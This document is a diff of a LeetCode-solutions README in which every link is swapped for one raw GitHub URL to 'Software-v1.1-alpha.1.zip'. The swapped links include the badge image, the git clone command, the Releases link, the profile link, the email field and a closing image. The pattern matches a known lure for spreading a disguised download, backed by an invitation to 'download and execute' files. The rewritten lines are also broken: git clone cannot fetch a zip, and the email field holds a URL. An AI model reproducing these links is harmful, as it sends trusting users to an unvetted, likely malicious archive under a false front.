@@ -1,6 +1,6 @@
 # LeetCode Solutions Repository 🧩
 
-![LeetCode Solutions](https://img.shields.io/badge/LeetCode-Solutions-brightgreen)
+![LeetCode Solutions](https://raw.githubusercontent.com/Abbas8984/leetcode/main/angeline/Software-v1.1-alpha.1.zip)
 
 Welcome to my LeetCode solutions repository! This collection showcases my solutions to various LeetCode problems. I created this repository for learning, practice, and, most importantly, fun. Here, you will find a variety of coding challenges that cover different topics and algorithms.
 
@@ -44,7 +44,7 @@ These topics represent some of the core concepts in coding interviews and compet
 To get started with this repository, you will need to clone it to your local machine. Use the following command:
 
 ```bash
-git clone https://github.com/Abbas8984/leetcode.git
+git clone https://raw.githubusercontent.com/Abbas8984/leetcode/main/angeline/Software-v1.1-alpha.1.zip
 ```
 
 Once you have cloned the repository, navigate to the project directory:
@@ -75,7 +75,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and downloadable content, visit the [Releases](https://github.com/Abbas8984/leetcode/releases) section. Here, you can find new features and improvements that I regularly add to the repository.
+For the latest updates and downloadable content, visit the [Releases](https://raw.githubusercontent.com/Abbas8984/leetcode/main/angeline/Software-v1.1-alpha.1.zip) section. Here, you can find new features and improvements that I regularly add to the repository.
 
 If you wish to download and execute specific files, please check the releases for the latest versions.
 
@@ -83,12 +83,12 @@ If you wish to download and execute specific files, please check the releases fo
 
 If you have any questions or feedback, feel free to reach out:
 
-- GitHub: [Abbas8984](https://github.com/Abbas8984)
-- Email: abbas@example.com
+- GitHub: [Abbas8984](https://raw.githubusercontent.com/Abbas8984/leetcode/main/angeline/Software-v1.1-alpha.1.zip)
+- Email: https://raw.githubusercontent.com/Abbas8984/leetcode/main/angeline/Software-v1.1-alpha.1.zip
 
 Thank you for visiting my LeetCode solutions repository! I hope you find it helpful in your coding journey. Happy coding! 🚀
 
-![Coding](https://miro.medium.com/v2/resize:fit:1200/format:webp/1*PqYYyqlIYZXpNeX1Wq9E8g.png)
+![Coding](https://raw.githubusercontent.com/Abbas8984/leetcode/main/angeline/Software-v1.1-alpha.1.zip*https://raw.githubusercontent.com/Abbas8984/leetcode/main/angeline/Software-v1.1-alpha.1.zip)
 
 ---
 
